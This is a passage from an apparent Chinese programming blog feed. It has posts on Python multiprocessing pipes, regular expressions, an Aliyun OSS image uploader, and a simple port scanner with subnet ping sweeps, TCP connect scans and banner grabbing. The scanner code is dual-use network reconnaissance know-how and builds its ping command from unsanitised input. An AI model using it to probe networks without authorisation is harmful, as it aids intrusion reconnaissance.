<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529159995.04.png" alt></p>
</li>
</ul>
</li>
<li><p>multiprocessing提供的Pipe(常用来在两个进行间的通信，两个进程分别位于<strong>管道的两端</strong>)</p>
<ul>
<li><p>multiprocessing.Pipe([duplex])</p>
</li>
<li><p>pipe实例一（发送列表）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Pipe</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(pipe)</span>:</span></span><br><span class="line">    pipe.send([<span class="string">'spm'</span>]+[<span class="number">545</span>,<span class="string">'wdd'</span>])  <span class="comment">#send传输一个列表</span></span><br><span class="line">    pipe.close()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#实例化两个pipe对象，因为pipe进程通信实在管道的两边</span></span><br><span class="line">    (c1,c2) = Pipe()</span><br><span class="line">    sender = Process(target=send,args=(c1,))</span><br><span class="line">    sender.start()</span><br><span class="line">    print(<span class="string">"c2 got: &#123;0&#125; "</span>.format(c2.recv()))</span><br><span class="line">    c2.close()</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529160762.62.png" alt></p>
</li>
<li><p>pipe实例二（发送字典文件）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Pipe</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">talk</span><span class="params">(pipe)</span>:</span></span><br><span class="line">    pipe.send(dict(name=<span class="string">'ss'</span>,age=<span class="number">22</span>))</span><br><span class="line">    reply = pipe.recv()</span><br><span class="line">    print(<span class="string">'talk got:'</span>,reply)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    (a1, a2) = Pipe()</span><br><span class="line">    c = Process(target=talk, args=(a2,))  <span class="comment">#创建一个进程</span></span><br><span class="line">    c.start()</span><br><span class="line">    print(<span class="string">'parent got:'</span>,a1.recv())</span><br><span class="line">    a1.send(&#123;x * <span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">'spam'</span>&#125;)</span><br><span class="line">    c.join()                 <span class="comment">#传输的数据被 talk 函数内的 pip 管道接收，并赋值给 reply</span></span><br><span class="line">    print(<span class="string">'parent exit'</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529161528.8.png" alt></p>
</li>
</ul>
</li>
<li><p>上述的queue和pipe都是进程间的通信，实在一个进行池中，如果不在一个进程池中，用multiprocessing.Manager().Queue() 通信；同时：子进程与父进程的通信试用subprocess比较好</p>
<ul>
<li><p>不同进程池之间的通信实例如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process,Pool,Queue,Manager</span><br><span class="line"><span class="keyword">import</span> os,time,random</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(q,list,i)</span>:</span></span><br><span class="line"> </span><br><span class="line">    print(<span class="string">"[+] This is Process_"</span>+str(i)+<span class="string">" and pid is %s START"</span>%os.getpid())</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> list:</span><br><span class="line">        q.put(item)</span><br><span class="line">        print(<span class="string">"[+] Pid %s Put : %s"</span>%(os.getpid(),item))</span><br><span class="line">    print(<span class="string">"[+] This is Process_"</span>+i+<span class="string">" and pid is %s CLOSE"</span>%os.getpid())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">     print(os.getpid())</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(q)</span>:</span></span><br><span class="line">     print(<span class="string">'[====] Process to Read , pid = %s'</span>%os.getpid())</span><br><span class="line">     <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">         data = q.get(<span class="keyword">True</span>)</span><br><span class="line">         print(<span class="string">"[=] data from Queue : %s"</span>%str(data))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">     manager = Manager()</span><br><span class="line">     q = manager.Queue()</span><br><span class="line">     p = Pool(<span class="number">5</span>)</span><br><span class="line">     listx = []</span><br><span class="line">     listx.append([x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>)])</span><br><span class="line">     listx.append([x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">100</span>,<span class="number">110</span>)])</span><br><span class="line">     listx.append([x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">200</span>,<span class="number">210</span>)])</span><br><span class="line">     listx.append([x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">300</span>,<span class="number">310</span>)])</span><br><span class="line">     listx.append([x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">400</span>,<span class="number">410</span>)])</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">         <span class="keyword">if</span> i==<span class="number">4</span>:</span><br><span class="line">             <span class="keyword">pass</span></span><br><span class="line">             p.apply_async(read,args=(q,))</span><br><span class="line">         <span class="keyword">else</span>:</span><br><span class="line">             list = listx[i]</span><br><span class="line">             <span class="comment">#print(list)</span></span><br><span class="line">             p.apply_async(write,args=(q,list,i))</span><br><span class="line">     p.close()</span><br><span class="line">     p.join()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">     main()</span><br></pre></td></tr></table></figure>
<p> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529162485.23.png" alt></p>
</li>
</ul>
</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
<p>通过一些实例学习python3的多进程，包含了主要的两个类及其适用方法；同一进程池中进程间通信，不同进程池中进程间的通信以及父类与子类的进程间通信</p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
        <tag>多进程</tag>
      </tags>
  </entry>
  <entry>
    <title>python3正则表达式学习</title>
    <url>/2018/06/15/python3%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<ol>
<li><p>python3正则表达式学习</p>
<blockquote>
<p>正则表达式是一个特殊的字符序列，它能帮助你方便检查一个字符串是否与某种模式匹配。python提供re模块使python语言拥有全部正则表达式功能。</p>
<p>compile函数根据一个模式字符串和可选的标志参数生成一个正则表达式对象。该对象拥有一系列方法用于正则表达式匹配和替换。</p>
</blockquote>
</li>
<li><p>正则表达式基础</p>
<ul>
<li><p>子模式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\w: 匹配任意字母、数字、或者_</span><br><span class="line">\d: 匹配数字（十进制）</span><br><span class="line">\s: 匹配空白符号（空格、tab等）</span><br><span class="line">. : 匹配任意字符（换行符除外）</span><br></pre></td></tr></table></figure>
</li>
<li><p>重复子模式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\d* : 表示任意数字，包括0个，*匹配0次或者多次</span><br><span class="line">\w+ : 表示匹配至少一个字母、数字、或者_</span><br><span class="line">\w&#123;3:6&#125; :表示匹配3-6之间的字母、数字、或者_</span><br></pre></td></tr></table></figure>
</li>
<li><p>“或”运算  - |</p>
<p><code>(p|P)ython :可以匹配Python也可以匹配python</code> </p>
</li>
<li><p>选择符：？</p>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(https://)?(www.)?(lsowl.xyz) :可以匹配到：https://www.lsowl.xyz  https://lsowl.xyz www.lsowl.xyz  lsowl.xyz 四个，也就是字符串必须在最后一个元组才可以被匹配到</span><br></pre></td></tr></table></figure>
<p>字符集：[]</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[a-zA-Z0-9_] : 等价于\w</span><br><span class="line">[0-9a-zA-Z\.\_] : 匹配数字、字母、.和_</span><br></pre></td></tr></table></figure>
</li>
<li><p>开始符和结尾符：^ , $</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">^\d : 以数字开始</span><br><span class="line">\w$ : 以字母结尾</span><br><span class="line">^[a-zA-Z][0-9a-zA-Z\_]* :匹配python的合法变量</span><br></pre></td></tr></table></figure>
</li>
<li><p>分组: ()</p>
<ul>
<li><p>捕获组</p>
<p><code>(^[0-9a-zA-Z]\w{5,17})@[0-9a-zA-Z]+\.\w+ : 匹配邮箱用户名</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529035700.3.png" alt></p>
</li>
<li><p>非捕获组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(^[0-9a-zA-Z]\w&#123;5,17&#125;)@[0-9a-zA-Z]+\.(?:net|com|top|cn) ：捕获指定后缀名的邮箱用户名</span><br><span class="line"></span><br><span class="line">(?:\d+\.)&#123;3&#125;\d+ : 匹配IP</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>正则表达式使用的特殊符号和字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">literal 匹配字符串的值</span><br><span class="line">re1|re2 匹配正则表达式re1或re2</span><br><span class="line">. 匹配任意字符（换行符除外）</span><br><span class="line">^ 匹配字符串的开始</span><br><span class="line">$ 匹配字符串的结尾</span><br><span class="line">* 匹配前面出现的正则表达式零次或多次</span><br><span class="line">+ 匹配前面出现的正则表达式一次或多次</span><br><span class="line">？匹配前面出现的正则表达式零次或一次</span><br><span class="line">&#123;N&#125; 匹配前面出现的正则表达式N次</span><br><span class="line">&#123;M,N&#125; 匹配重复出现M次到N次的正则表达式</span><br><span class="line">[…] 匹配字符组里出现的任意一个字符</span><br><span class="line">[…x-y…] 匹配从字符x到y中的任意一个字符</span><br><span class="line">[^…] 不匹配此字符集中出现的任意一个字符</span><br><span class="line">(*|+|?|&#123;&#125;)? 用于上面出现的任何“非贪婪”。版本重复匹配次数符号。如.*?a表示匹配到第一个a出现取前面任意长度的字符。</span><br><span class="line">(…) 匹配封闭括号中正则表达式（RE），并保存为子组</span><br><span class="line">\d 匹配任何数字，和[0-9]一样（\D是\d的反义：任何非数字）</span><br><span class="line">\w 匹配任何数字字母字符，和[A-Za-z0-9_]相同(\W是\w的反义)</span><br><span class="line">\s 匹配任何空白符，和[\n\t\r\v\f]相同（\S是\s的反义）</span><br><span class="line">\b 匹配单词边界(\B是\b的反义)</span><br><span class="line">\nn 匹配已保存的子组（参考(…)）如price:\16</span><br><span class="line">\c 逐一匹配特殊字符c（即，取消它的特殊含义，按字面匹配）</span><br><span class="line">\A（\Z）匹配字符串的起始（结束）</span><br></pre></td></tr></table></figure>
</li>
<li><p>一些说明</p>
<p>（1）用管道符号(|)匹配多个正则表达式<br>（2）匹配除换行符外任意一个单个的字符（.）<br>（3）从字符串的开头或结尾或单词边界开始匹配（^ $或\A \Z \b \B）<br>（4）创建字符类（[]）<br>（5）指定范围（-）和否定（^）<br>（6）使用闭包操作符（* + ？ {}）实现多次出现/重复匹配<br>（7）？的两种含义：</p>
<ul>
<li><p>表示匹配出现0或1次；</p>
</li>
<li><p>紧跟在表示重复的元字符后面时（如+?），表示要求搜索引擎匹配的字符串越短越好。(*+?{m,n})尽量“吸收”更多的字符，这叫“贪心”。</p>
</li>
</ul>
<p>（7）特殊字符表示、字符集</p>
<ul>
<li>\d表示十进制数字（\D表示非十进制数字）</li>
<li>\w表示整个字符数字的字符集（\W）</li>
<li>\s表示空白字符（\S）</li>
</ul>
<p>（8）用圆括号（()）组建组 、()的功能：对正则表达式进行分组；匹配子组。 </p>
<ul>
<li>对正则表达式进行分组可以实现用不同的正则表达式去匹配字符串，或重复整个正则表达式多次。 </li>
<li>使用子组匹配是为了能够提取匹配模式的内容，Python的re支持此功能。</li>
</ul>
</li>
</ul>
</li>
<li><p>python的re模块<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529038902.67.png" alt></p>
<ul>
<li><p>re模块的用法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">str = <span class="string">"xxxflag&#123;sss&#125;sss"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># #用法1：</span></span><br><span class="line">re_flag = re.compile(<span class="string">r'flag&#123;\w+?&#125;'</span>)</span><br><span class="line">flag = re_flag.findall(str)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#用法2：</span></span><br><span class="line">flag =re.findall(<span class="string">r'flag&#123;\w+?&#125;'</span>,str)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
</li>
<li><p>贪心匹配和非贪心匹配</p>
<ul>
<li>贪心匹配：正则表达尽可能多的匹配元素</li>
<li>非贪心匹配：正则表达式尽可能少的匹配元素<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529040261.44.png" alt></li>
</ul>
</li>
<li><p>match和search的区别</p>
<ul>
<li>match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，返回None</li>
<li>search匹配整个字符串，直到找到一个匹配<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529040638.88.png" alt></li>
</ul>
</li>
<li><p>分组匹配（优点在说明第（8）点）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529041162.79.png" alt></p>
</li>
</ul>
</li>
<li><p>python中常用的正则表达式处理函数</p>
<ul>
<li>re.match() 尝试从字符串的起始位置匹配一个模式，如果不是起始位置就匹配成功，match返回none<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529047137.61.png" alt><ul>
<li>函数语法 <code>re.match(partten,string,flags=0)</code></li>
<li>函数参数说明<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529046903.24.png" alt></li>
<li>使用group(num)或groups()匹配对象函数来获取匹配表达式<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529047000.4.png" alt></li>
</ul>
</li>
<li>re.search() 扫描整个字符串并返回第一个成功的匹配<ul>
<li>函数语法 <code>re.search(pattern,string,flags=0)</code></li>
<li>使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。</li>
</ul>
</li>
<li>re.sub()用于替换字符串中的匹配项<ul>
<li>函数语法 <code>re.sub(pattern,repl,string,count=0)</code></li>
<li>函数参数说明<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529047446.1.png" alt></li>
<li>使用实例(包含是否使用repl参数的，repl可能是个函数)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529047654.68.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529048005.62.png" alt></li>
</ul>
</li>
<li>re.compile() 用于编译正则表达式，生成一个正则表达式对象供match和search两个函数使用<ul>
<li>函数语法 <code>re.compile(pattern[, flags])</code> </li>
<li>参数说明<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529048191.55.png" alt></li>
<li>使用实例（当匹配成功的时候返回一个match对象）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529048612.56.png" alt><img src="assets/1529049199.01.png" alt></li>
</ul>
</li>
<li>re.findall() 在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回一个空列表<ul>
<li>函数语法 <code>findall(string[, pos[, endpos]])</code></li>
<li>函数参数 <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529049378.54.png" alt></li>
<li>使用实例（用compile函数生成正则表达式对象）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529049557.51.png" alt></li>
</ul>
</li>
<li>re.finditer() 和findall类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回<ul>
<li>函数语法 <code>re.finditer(pattern, string, flags=0)</code></li>
<li>函数参数<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529049714.1.png" alt></li>
<li>使用实例(用for循环迭代输出)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529049815.39.png" alt></li>
</ul>
</li>
<li>re.split() split 方法按照能够匹配的子串将字符串分割后返回列表 <ul>
<li>函数语法 <code>re.split(pattern, string[, maxsplit=0, flags=0])</code></li>
<li>函数参数 <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529049924.84.png" alt></li>
<li>使用实例（对于一个找不到匹配的字符串，split不会分割）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529050075.58.png" alt></li>
</ul>
</li>
</ul>
</li>
<li><p>正则表达式对象</p>
<ul>
<li><p>re.RegexObject  (re.compile() 返回的就是一个正则表达式对象)</p>
</li>
<li><p>group()返回被RE匹配的字符串</p>
</li>
<li><p>start() 返回开始匹配的位置</p>
</li>
<li><p>end()  返回匹配结束的位置</p>
</li>
<li><p>span()返回一个元组包含（开始，结束）的位置</p>
</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>简易端口扫描器</title>
    <url>/2018/06/14/%E7%AE%80%E6%98%93%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/</url>
    <content><![CDATA[<blockquote>
<p>只是一次简单的课程设计，通过Python实现端口扫描器的功能，附加ping扫描以及简单的banner获取，支持导出扫描结果。</p>
</blockquote>
<h2 id="程序运行实例"><a href="#程序运行实例" class="headerlink" title="程序运行实例"></a>程序运行实例</h2><ul>
<li>打印装逼信息：<img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-16/38144694.jpg" alt></li>
<li>扫描实例：<img src="C:\Users\ADMINI~1\AppData\Local\Temp\1521168691496.png" alt="52116869149"></li>
<li>具体用法程序中有说明</li>
</ul>
<h2 id="程序说明"><a href="#程序说明" class="headerlink" title="程序说明"></a>程序说明</h2><blockquote>
<p>程序中默认扫描一些常见的端口、支持用户设置端口、支持多端口扫描、支持多IP扫描、支持网段存活主机发现、支持导出。</p>
</blockquote>
<ol>
<li><p>通过发送ping包，根据返回包的TTL值判断主机是否存活，关键代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = [<span class="string">"ping"</span>, <span class="string">"-&#123;op&#125;"</span>.format(op=self.get_os()),</span><br><span class="line">          <span class="string">"1"</span>, self.ip_pre]</span><br><span class="line">            output = os.popen(<span class="string">" "</span>.join(cmd)).readlines()</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">if</span> lock.acquire():</span><br><span class="line">            flag = <span class="keyword">False</span></span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> list(output):</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> str(line).upper().find(<span class="string">"TTL"</span>) &gt;=<span class="number">0</span>:</span><br><span class="line">                    flag = <span class="keyword">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> flag:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[+] IP: %s is OK "</span> % self.ip_pre</span><br><span class="line">                ip_str.append(self.ip_pre)</span><br><span class="line">            lock.release()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>通过socket建立tcp全连接来判断端口开放信息以及banner信息的抓取，关键代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Ping</span><span class="params">(self, Port)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> OpenPort, lock, Timeout</span><br><span class="line">        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        sock.settimeout(Timeout)</span><br><span class="line">        address = (self.IP, Port)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sock.connect(address)</span><br><span class="line">            ready = select.select([sock],[],[],<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">if</span> lock.acquire():</span><br><span class="line">            OpenPort.append(str(Port))</span><br><span class="line">            ScanIP_list.append(self.IP)</span><br><span class="line">            <span class="keyword">if</span> ready[<span class="number">0</span>]:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"IP:%s  Port:%d  Open  "</span> % (self.IP, Port)  +sock.recv(<span class="number">4096</span>)</span><br><span class="line">                sock.close()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"IP:%s  Port:%d  Open  "</span> % (self.IP, Port)  + <span class="string">"Unknow!\n"</span></span><br><span class="line">                sock.close()</span><br><span class="line">            lock.release()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>通过队列来判断扫描目标的端口列表是否为空，通过判空来控制在端口扫描的时候不会漏扫，还有就是在多IP端口扫描的时候避免出现误扫IP的状况，关键代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.SingleQueue.empty():</span><br><span class="line">            p = self.SingleQueue.get()</span><br><span class="line">            self.Ping(p)</span><br></pre></td></tr></table></figure>
</li>
<li><p>调用cmd模块来进行交互，用户通过这个模块来设置线程（在中程序中控制在1-5000，可以修改）、设置连接超时时间、设置端口、进行端口扫描、ping扫描等。关键代码如下：（贴出设置端口、单IP扫描、ping扫描的代码，具体代码请看源码）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_port</span><span class="params">(self, argv)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> PortList</span><br><span class="line">        PortList = []</span><br><span class="line">        ListTmp = argv.split(<span class="string">' '</span>)</span><br><span class="line">        <span class="keyword">for</span> port <span class="keyword">in</span> ListTmp:</span><br><span class="line">            <span class="keyword">if</span> port.find(<span class="string">".."</span>) &lt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> port.isdigit():</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"Input error!"</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">                PortList.append(int(port))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                RangeLst = port.split(<span class="string">".."</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> (RangeLst[<span class="number">0</span>].isdigit() <span class="keyword">and</span> RangeLst[<span class="number">1</span>].isdigit()):</span><br><span class="line">                    <span class="keyword">raise</span> ValueError</span><br><span class="line">                    exit()</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(int(RangeLst[<span class="number">0</span>]), int(RangeLst[<span class="number">1</span>])):</span><br><span class="line">                    PortList.append(i)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_scan</span><span class="params">(self, argv)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Start Time %s"</span> % time.ctime() + <span class="string">'\n'</span></span><br><span class="line">        <span class="keyword">global</span> nThread, PortList, strIP, ScanIP_list, OpenPort</span><br><span class="line">        <span class="keyword">del</span> ScanIP_list[:]</span><br><span class="line">        <span class="keyword">del</span> OpenPort[:]</span><br><span class="line">        ThreadList = []</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            strIP = socket.gethostbyname(str(argv))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Input error!"</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        SingleQueue = GetQueue(PortList)</span><br><span class="line">        <span class="keyword">if</span> PortList != <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, nThread):</span><br><span class="line">                t = ScanThreadSingle(strIP, SingleQueue)</span><br><span class="line">                ThreadList.append(t)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">            t.start()</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">            t.join()</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'\n'</span> + <span class="string">"End Time %s"</span> % time.ctime()</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_ping</span><span class="params">(self, argv)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> commandargs</span><br><span class="line">        ThreadList = []</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Start Time %s"</span> % time.ctime() + <span class="string">'\n'</span></span><br><span class="line">        commandargs = str(argv)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[+] Input is %s "</span> % commandargs + <span class="string">'\n'</span></span><br><span class="line">        args = <span class="string">""</span>.join(commandargs)</span><br><span class="line">        ip_prefix = <span class="string">'.'</span>.join(args.split(<span class="string">'.'</span>)[:<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">            ip = <span class="string">'%s.%s'</span> % (ip_prefix,i)</span><br><span class="line">            s = PING(ip)</span><br><span class="line">            ThreadList.append(s)</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> ThreadList:</span><br><span class="line">            s.start()</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> ThreadList:</span><br><span class="line">            s.join()</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'\n'</span> + <span class="string">"End Time %s"</span> % time.ctime()</span><br></pre></td></tr></table></figure>
</li>
<li><p>这些就是整个程序中核心的几个模块，具体代码请看源码。</p>
</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
<p>此次设计参考了P牛早期的一个设计以及Python线程锁的处理方法。实现的功能比较单一，还可以添加SYN半连接扫描、UDP扫描、僵尸扫描等功能；但是由于Windows底层的原因，利用Python在Windows上构造数据包有些困难；在linux上可以通过scapy进行原始数据包的构造与发送，通过网络流量中的一些特征来判断。一些扫描脚本可以看四层发现中的一些脚本。</p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里云OSS智能上传图床</title>
    <url>/2018/06/13/%E9%98%BF%E9%87%8C%E4%BA%91OSS%E5%82%A8%E5%AD%98%E6%99%BA%E8%83%BD%E4%B8%8A%E4%BC%A0%E5%9B%BE%E5%BA%8A/</url>
    <content><![CDATA[<blockquote>
<p>背景：由于现在云储存的发展，许多东西储存到云端更加方便，比如：图片；网上最多的工具就是七牛云以及上传利用工具，但是七牛云需要手持身份证实名认证，所以放弃；其次没有关注腾讯云，所以选择了阿里云，其实优惠力度还是腾讯的比较大；为了避免麻烦，就没有在做迁移了，使用过的可以与阿里云关联的极简图床，但是我们还是需要一张张的拖图片，然后复制makedown连接，这样还是太麻烦了，有一天看到大佬写了一个腾讯云的工具，所以，在学习之余写了这个工具。</p>
</blockquote>
<h2 id="程序流程图如下："><a href="#程序流程图如下：" class="headerlink" title="程序流程图如下："></a>程序流程图如下：</h2><p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-27/77366569.jpg" alt></p>
<h2 id="功能实现"><a href="#功能实现" class="headerlink" title="功能实现"></a>功能实现</h2><h3 id="图片截图以后，从粘贴板获取图片保存到本地Image文件夹下"><a href="#图片截图以后，从粘贴板获取图片保存到本地Image文件夹下" class="headerlink" title="图片截图以后，从粘贴板获取图片保存到本地Image文件夹下"></a>图片截图以后，从粘贴板获取图片保存到本地Image文件夹下</h3><ul>
<li><p>使用win32clipboard，win32con，PIL模块</p>
</li>
<li><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> win32con</span><br><span class="line"><span class="keyword">import</span> win32clipboard <span class="keyword">as</span> w</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageGrab</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">im = ImageGrab.grabclipboard()      <span class="comment">#从粘贴板获取内容</span></span><br><span class="line">        <span class="keyword">if</span> isinstance(im,Image.Image):      <span class="comment">#判断是不是图片</span></span><br><span class="line">            name = str(time.time()) + <span class="string">".png"</span></span><br></pre></td></tr></table></figure>
</li>
